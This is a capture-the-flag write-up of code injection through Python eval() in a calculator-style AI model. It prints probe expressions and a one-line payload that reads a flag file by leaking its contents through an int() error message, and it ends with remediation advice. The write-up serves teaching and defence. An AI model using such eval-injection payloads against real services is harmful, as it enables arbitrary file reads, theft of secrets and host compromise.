# Advanced L5 — Bad Robot

| | |
|---|---|
| **Class** | Code injection via `eval()` |
| **CWE** | CWE-95 (parent CWE-94) |
| **OWASP LLM** | LLM06:2025 — Excessive Agency |
| **Severity** | High · CVSS 3.1 **7.7** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
| **Flag** | `flag-XXXXXX` (redacted) |

## The target

A terminal-style assistant with one advertised capability: "Math service active. Send me an expression to calculate. I can handle arithmetic and logic."

Underneath, the calculator is a real CPython evaluation of the submitted expression. The only visible control is a check on the **final return value**: strings, lists, slices and `None` are refused with `Error: Output format not supported.`

## Establishing the surface

Three probes were enough to know what this was:

```python
__import__('math').sqrt(16)          # -> Result: 4.0
(print("BAD_ROBOT_TEST"), 1)[1]      # -> Result: 1     (print executed)
sorted([3,1,2])[0]                   # -> Result: 1     (list built, then indexed)
```

`__import__` reachable means full builtins. `print(...)` rejected as a *type* but executed anyway means the filter runs **after** evaluation and governs display only. Neither probe is an exploit yet; together they describe the sink.

## The path

The flag file was readable from the service working directory, and the error channel bypasses the type filter entirely:

```python
int(open('flag.txt').read())
```

`open()` reads the file; `int()` raises `ValueError` quoting its argument; the UI renders error text unconditionally:

```text
Result: Error: invalid literal for int() with base 10: 'flag-XXXXXX'
The expression could not be evaluated.
```

One expression. No chaining, no encoding, no model manipulation.

## Root cause

No capability separation between "do arithmetic" and "operate on the host". Untrusted input reaches `eval()` in the process that hosts the service, with the complete builtin namespace (`__import__`, `open`, `print`).

The apparent guard is not a guard: an output-type check on the return value cannot retroactively constrain capabilities already exercised during evaluation. It is a renderer check wearing a security label.

## Impact

**Demonstrated:** arbitrary file read inside the service's filesystem namespace. In production the same primitive reads configuration, environment files, API keys and mounted secrets — the standard first step to host compromise.

**Available, deliberately not exercised:** OS command execution. `__import__` was proven reachable, which makes `os.system`/`subprocess` a one-liner, but it was unnecessary for the flag and would have added destructive capability to the record without adding evidence.

**Not tested:** file write, network egress.

## Remediation

1. Do not `eval()` untrusted input. Parse to an AST and allowlist numeric operators, comparisons and a small set of functions.
2. If evaluation must happen, run it in a separate process with no filesystem, no network and a memory/CPU ceiling.
3. Treat the tool's output contract as separate from its capability model — never rely on an output filter as a security boundary.
4. Return generic errors. An error message that quotes its input is an exfiltration channel.

## Note on classification

The platform's own post-level panel classified this as *Code Injection via eval()*. That is the vendor's wording, not an inference — but the finding above stands on the probes alone: `open()` executed and its contents were rendered.
